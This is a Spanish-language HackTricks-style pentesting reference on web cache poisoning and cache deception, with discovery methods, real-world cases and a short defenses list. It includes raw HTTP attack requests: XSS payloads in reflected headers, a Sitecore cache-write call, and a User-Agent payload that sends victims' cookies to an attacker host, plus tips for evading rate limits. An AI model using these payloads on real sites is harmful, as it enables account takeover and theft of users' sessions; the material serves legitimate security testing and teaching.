# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La diferencia

> **¿Cuál es la diferencia entre web cache poisoning y web cache deception?**
>
> - In **web cache poisoning**, el atacante hace que la aplicación almacene contenido malicioso en la caché, y ese contenido se sirve desde la caché a otros usuarios de la aplicación.
> - In **web cache deception**, el atacante hace que la aplicación almacene contenido sensible perteneciente a otro usuario en la caché, y luego recupera ese contenido desde la caché.

## Cache Poisoning

Cache poisoning tiene como objetivo manipular la caché del lado del cliente para forzar a los clientes a cargar recursos inesperados, parciales o bajo el control de un atacante. La magnitud del impacto depende de la popularidad de la página afectada, ya que la respuesta contaminada se sirve exclusivamente a los usuarios que visitan la página durante el periodo de envenenamiento de la caché.

La ejecución de un ataque de cache poisoning implica varios pasos:

1. **Identification of Unkeyed Inputs**: Estos son parámetros que, aunque no sean necesarios para que una request sea cacheada, pueden alterar la respuesta devuelta por el servidor. Identificar estos inputs es crucial ya que pueden explotarse para manipular la caché.
2. **Exploitation of the Unkeyed Inputs**: Tras identificar los unkeyed inputs, el siguiente paso implica averiguar cómo abusar de estos parámetros para modificar la respuesta del servidor de manera que beneficie al atacante.
3. **Ensuring the Poisoned Response is Cached**: El paso final es asegurarse de que la respuesta manipulada se almacene en la caché. De ese modo, cualquier usuario que acceda a la página afectada mientras la caché esté envenenada recibirá la respuesta contaminada.

### Descubrimiento: Comprueba cabeceras HTTP

Por lo general, cuando una respuesta fue **almacenada en la caché** habrá una **cabecera que lo indique**; puedes comprobar qué cabeceras debes vigilar en este post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Descubrimiento: Almacenamiento en caché de códigos de error

Si sospechas que la respuesta se está almacenando en caché, podrías intentar **enviar requests con una cabecera malformada**, lo que debería responder con un **status code 400**. Luego intenta acceder a la request de forma normal y si la **respuesta es un status code 400**, sabes que es vulnerable (y podrías incluso realizar un DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Sin embargo, ten en cuenta que **a veces este tipo de status codes no se cachean**, por lo que esta prueba podría no ser fiable.

### Descubrimiento: Identificar y evaluar unkeyed inputs

You could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** that may be **changing the response of the page**. For example, a page may be using the header `X-Forwarded-For` to indicate the client to load the script from there:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicit a harmful response from the back-end server

Con el parámetro/encabezado identificado, comprueba cómo se está **saneando** y **dónde** se **refleja** o afecta la respuesta desde el encabezado. ¿Puedes abusar de él de todos modos (realizar un XSS o cargar un código JS controlado por ti? ¿realizar un DoS?...)

### Get the response cached

Una vez que hayas **identificado** la **página** que puede ser abusada, qué **parámetro**/**encabezado** usar y **cómo** **abusar** de él, necesitas que la página quede en caché. Dependiendo del recurso que estés intentando almacenar en la caché esto podría tardar, puede que necesites intentarlo durante varios segundos.

El encabezado **`X-Cache`** en la respuesta puede ser muy útil ya que puede tener el valor **`miss`** cuando la petición no fue cacheada y el valor **`hit`** cuando está cacheada.\
El encabezado **`Cache-Control`** también es interesante para saber si un recurso se está cacheando y cuándo será la próxima vez que el recurso volverá a ser cacheado: `Cache-Control: public, max-age=1800`

Otro encabezado interesante es **`Vary`**. Este encabezado suele usarse para **indicar encabezados adicionales** que se tratan como **parte de la clave de caché**, incluso si normalmente no forman parte de la clave. Por lo tanto, si el atacante conoce el `User-Agent` de la víctima a la que apunta, puede envenenar la caché para los usuarios que usen ese `User-Agent` específico.

Un encabezado más relacionado con la caché es **`Age`**. Define el tiempo en segundos que el objeto lleva en la caché del proxy.

Al cachear una petición, ten **cuidado con los encabezados que usas** porque algunos de ellos podrían ser **usados inesperadamente** como **parte de la clave** y la **víctima necesitará usar ese mismo encabezado**. Siempre **prueba** un Cache Poisoning con **distintos navegadores** para comprobar si está funcionando.

## Exploiting Examples

### Easiest example

Un encabezado como `X-Forwarded-For` se está reflejando en la respuesta sin sanear.\
Puedes enviar una carga útil XSS básica y envenenar la caché para que todos los que accedan a la página sufran XSS:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nótese que esto envenenará una petición a `/en?region=uk` y no a `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** se explica el siguiente escenario simple:

- El CDN almacenará en caché cualquier cosa bajo `/share/`
- El CDN NO decodificará ni normalizará `%2F..%2F`, por lo tanto, puede usarse como **path traversal to access other sensitive locations that will be cached** como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- El servidor web decodificará y normalizará `%2F..%2F`, y responderá con `/api/auth/session`, que **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Las cookies también podrían reflejarse en la respuesta de una página. Si puedes abusar de ello para provocar un XSS, por ejemplo, podrías explotar XSS en varios clientes que carguen la respuesta de caché maliciosa.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Ten en cuenta que si la cookie vulnerable es muy usada por los usuarios, las solicitudes regulares limpiarán la caché.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Consulta:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) cómo fue posible robar una OpenAI API key con una URL como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` porque cualquier cosa que coincida con `/share/*` se almacenaría en caché sin que Cloudflare normalizara la URL, lo cual sí se hacía cuando la solicitud llegaba al servidor web.

Esto también se explica mejor en:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A veces necesitarás **exploit several unkeyed inputs** para poder abusar de una caché. Por ejemplo, puedes encontrar un **Open redirect** si estableces `X-Forwarded-Host` a un dominio que controlas y `X-Forwarded-Scheme` a `http`. Si el **servidor** está **redirigiendo** todas las solicitudes **HTTP** **a HTTPS** y usa el header `X-Forwarded-Scheme` como el nombre de dominio para el redirect, puedes controlar hacia dónde apunta la página mediante la redirección.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Explotando con `Vary` header limitado

Si encontraste que la cabecera **`X-Host`** se está usando como **nombre de dominio para cargar un recurso JS** pero la cabecera **`Vary`** en la respuesta indica **`User-Agent`**. Entonces necesitas encontrar una forma de exfiltrate el User-Agent de la víctima y poison the cache usando ese user agent:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Envía una GET request con la request tanto en la URL como en el body. Si el web server utiliza la que está en el body pero el cache server cachea la que está en la URL, cualquiera que acceda a esa URL acabará utilizando el parameter del body. Como la vuln que James Kettle encontró en el sitio de Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Hay un laboratorio de PortSwigger sobre esto: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Por ejemplo, es posible separar **parameters** en servidores ruby usando el carácter **`;`** en lugar de **`&`**. Esto puede usarse para insertar valores de parámetros sin clave dentro de parámetros con clave y abusar de ello.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Aprende aquí cómo realizar [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

El [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) puede usarse para probar automáticamente Web Cache Poisoning. Soporta muchas técnicas diferentes y es altamente personalizable.

Ejemplo de uso: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Este patrón del mundo real encadena una primitiva de reflexión basada en headers con el comportamiento del CDN/WAF para envenenar de forma fiable el HTML cacheado servido a otros usuarios:

- El HTML principal reflejaba un header de petición no confiable (p. ej., `User-Agent`) dentro de un contexto ejecutable.
- El CDN eliminaba headers de caché pero existía una caché interna/origen. El CDN también almacenaba automáticamente en caché peticiones que terminaban en extensiones estáticas (p. ej., `.js`), mientras que el WAF aplicaba una inspección de contenido más débil a los GETs de assets estáticos.
- Peculiaridades en el flujo de peticiones permitían que una petición a una ruta `.js` influyera en la cache key/variant usada para el HTML principal siguiente, permitiendo XSS entre usuarios vía reflexión de headers.

Receta práctica (observada en un CDN/WAF popular):

1) Desde una IP limpia (evita degradaciones previas por reputación), configura un `User-Agent` malicioso vía el navegador o Burp Proxy Match & Replace.
2) En Burp Repeater, prepara un grupo de dos peticiones y usa "Send group in parallel" (el modo single-packet funciona mejor):
- Primera petición: realiza un GET a una ruta de recurso `.js` en el mismo origin mientras envías tu `User-Agent` malicioso.
- Inmediatamente después: GET la página principal (`/`).
3) La carrera de enrutamiento del CDN/WAF junto con el `.js` auto-cacheado a menudo siembra una variante de HTML cacheado envenenada que luego se sirve a otros visitantes que comparten las mismas condiciones de cache key (p. ej., mismas dimensiones `Vary` como `User-Agent`).

Ejemplo de payload de header (para exfiltrar cookies no HttpOnly):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Muchos CDN ocultan cache headers; poisoning puede aparecer solo en ciclos de refresh de varias horas. Usa múltiples vantage IPs y throttle para evitar triggers de rate-limit o reputación.
- Usar una IP del cloud propio del CDN a veces mejora la consistencia de routing.
- Si un CSP estricto está presente, esto aún funciona si la reflexión se ejecuta en el main HTML context y el CSP permite inline execution o es bypassed por context.

Impact:

- Si las session cookies no son `HttpOnly`, un zero-click ATO es posible por mass-exfiltrating `document.cookie` desde todos los usuarios que reciben el poisoned HTML.

Defenses:

- Deja de reflejar request headers en HTML; haz strict context-encode si es inevitable. Alinea las cache policies del CDN y del origin y evita variar en untrusted headers.
- Asegúrate de que WAF aplique content inspection de forma consistente a las requests `.js` y a static paths.
- Configura `HttpOnly` (y `Secure`, `SameSite`) en las session cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Un patrón específico de Sitecore permite escrituras no autenticadas al HtmlCache abusando de pre‑auth XAML handlers y de la reflexión de AjaxScriptManager. Cuando se alcanza el handler `Sitecore.Shell.Xaml.WebControl`, un `xmlcontrol:GlobalHeader` (derivado de `Sitecore.Web.UI.WebControl`) está disponible y se permite la siguiente reflective call:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Esto escribe HTML arbitrario bajo una cache key elegida por el atacante, habilitando un poisoning preciso una vez que los cache keys son conocidos.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Ejemplos vulnerables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS reenviaba el fragmento dentro de la URL sin quitarlo y generaba el cache key usando solo el host, path y query (ignorando el fragment). Así que la petición `/#/../?r=javascript:alert(1)` se envió al backend como `/#/../?r=javascript:alert(1)` y el cache key no tenía el payload dentro, solo host, path y query.

### GitHub CP-DoS

Enviar un valor inválido en el content-type header provocaba una respuesta 405 cacheada. El cache key contenía la cookie por lo que solo era posible atacar a usuarios no autenticados.

### GitLab + GCP CP-DoS

GitLab usa GCP Buckets para almacenar contenido estático. **GCP Buckets** soportan el **header `x-http-method-override`**. Por lo tanto fue posible enviar el header `x-http-method-override: HEAD` y envenenar el cache para que devolviera un body de respuesta vacío. También podría soportar el método `PURGE`.

### Rack Middleware (Ruby on Rails)

En aplicaciones Ruby on Rails se utiliza a menudo Rack middleware. El propósito del código Rack es tomar el valor del header **`x-forwarded-scheme`** y establecerlo como el scheme de la request. Cuando se envía el header `x-forwarded-scheme: http`, ocurre un redirect 301 a la misma ubicación, potencialmente causando un Denial of Service (DoS) a ese recurso. Además, la aplicación podría reconocer el header `X-forwarded-host` y redirigir a los usuarios al host especificado. Este comportamiento puede llevar a la carga de archivos JavaScript desde el servidor de un atacante, lo que supone un riesgo de seguridad.

### 403 and Storage Buckets

Cloudflare previamente cacheaba respuestas 403. Intentar acceder a S3 o Azure Storage Blobs con Authorization headers incorrectos resultaba en una respuesta 403 que se almacenaba en cache. Aunque Cloudflare ha dejado de cachear respuestas 403, este comportamiento puede seguir presente en otros servicios proxy.

### Injecting Keyed Parameters

Los caches a menudo incluyen parámetros GET específicos en el cache key. Por ejemplo, Varnish de Fastly cacheaba el parámetro `size` en las peticiones. Sin embargo, si se enviaba también una versión URL-encoded del parámetro (p. ej. `siz%65`) con un valor erróneo, el cache key se construiría usando el parámetro `size` correcto. Aun así, el backend procesaría el valor en el parámetro URL-encoded. URL-encodear el segundo parámetro `size` hacía que fuera omitido por el cache pero utilizado por el backend. Asignar un valor de 0 a este parámetro resultaba en un 400 Bad Request cacheable.

### User Agent Rules

Algunos desarrolladores bloquean requests con user-agents que coinciden con herramientas de alto tráfico como FFUF o Nuclei para gestionar la carga del servidor. Irónicamente, este enfoque puede introducir vulnerabilidades como cache poisoning y DoS.

### Illegal Header Fields

El [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) especifica los caracteres aceptables en los nombres de header. Headers que contienen caracteres fuera del rango **tchar** deberían idealmente provocar una respuesta 400 Bad Request. En la práctica, los servidores no siempre cumplen este estándar. Un ejemplo notable es Akamai, que reenvía headers con caracteres inválidos y cachea cualquier error 400, siempre que el header `cache-control` no esté presente. Se identificó un patrón explotable donde enviar un header con un carácter ilegal, como `\`, resultaba en un 400 Bad Request cacheable.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

El objetivo de Cache Deception es hacer que los clientes carguen recursos que van a ser guardados por el cache con su información sensible.

Antes que nada, observa que las extensiones como `.css`, `.js`, `.png`, etc. suelen estar configuradas para ser guardadas en el cache. Por lo tanto, si accedes a `www.example.com/profile.php/nonexistent.js` el cache probablemente almacenará la respuesta porque detecta la extensión `.js`. Pero, si la aplicación está respondiendo con los contenidos sensibles del usuario almacenados en _www.example.com/profile.php_, puedes robar esos contenidos de otros usuarios.

Otras cosas para probar:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Otro ejemplo muy claro se puede encontrar en este write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
En el ejemplo se explica que si cargas una página inexistente como _http://www.example.com/home.php/non-existent.css_ el contenido de _http://www.example.com/home.php_ (**con la información sensible del usuario**) será devuelto y el servidor de cache guardará el resultado.\
Luego, el **attacker** puede acceder a _http://www.example.com/home.php/non-existent.css_ desde su propio navegador y observar la información confidencial de los usuarios que accedieron antes.

Ten en cuenta que el **cache proxy** debe estar **configurado** para **cachear** archivos **basándose** en la **extensión** del archivo (_.css_) y no en el content-type. En el ejemplo _http://www.example.com/home.php/non-existent.css_ tendrá un content-type `text/html` en lugar de un mime type `text/css`.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Herramientas automáticas

- [**toxicache**](https://github.com/xhzeem/toxicache): Escáner en Golang para encontrar vulnerabilidades de web cache poisoning en una lista de URLs y probar múltiples técnicas de inyección.

## Referencias

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
